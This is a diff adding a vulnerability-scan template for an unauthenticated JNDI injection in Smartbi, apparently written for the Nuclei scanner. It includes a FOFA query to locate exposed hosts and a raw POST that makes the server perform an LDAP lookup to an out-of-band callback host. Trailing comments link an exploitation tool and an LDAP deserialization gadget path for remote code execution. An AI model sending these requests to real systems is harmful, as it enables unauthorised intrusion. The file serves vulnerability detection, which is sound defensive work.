@@ -1,0 +1,33 @@
+id: smartbi-db2-params-rce
+
+info:
+  name: smartbi-db2-params-rce
+  author: yy
+  severity: high
+  description: Smartbi 是思迈特软件推出的商业智能BI软件，Smartbi存在未授权访问后台接口漏洞，结合 DB2 JDBC 利用方式，可导致 JNDI 注入漏洞。
+  tags: smartbi,rce
+  metadata:
+    fofa-qeury: app="SMARTBI" || body="gcfutil = jsloader.resolve('smartbi.gcf.gcfutil')"
+    veified: true
+    max-request: 2
+
+http:
+  - raw:
+      - |       
+        GET /vision/index.jsp HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+      - |
+        @timeout: 5s       
+        POST //vision/.stub?className=DataSourceService&methodName=testConnection&params=%5B%7B%22driverType%22%3A%22aaa%22%2C%22driver%22%3A%22com.ibm.db2.jcc.DB2Driver%22%2C%22maxConnection%22%3A1%2C%22transactionIsolation%22%3A1%2C%22validationQueryMethod%22%3A3%2C%22url%22%3A%22jdbc%3Adb2%3A%2F%2F127.0.0.1%3A18080%2Fa%3AclientRerouteServerListJNDIName%3Dldap%3A%2F%2F{{interactsh-url}}%22%7D%5D HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+               
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
+#利用: https://github.com/charonlight/xxl-jobExploitGUI/releases/tag/v1.0 
+#ldap://xx.xx.xx.xx:1389/Deserialization/CommonsBeanutils1/TomcatEcho         
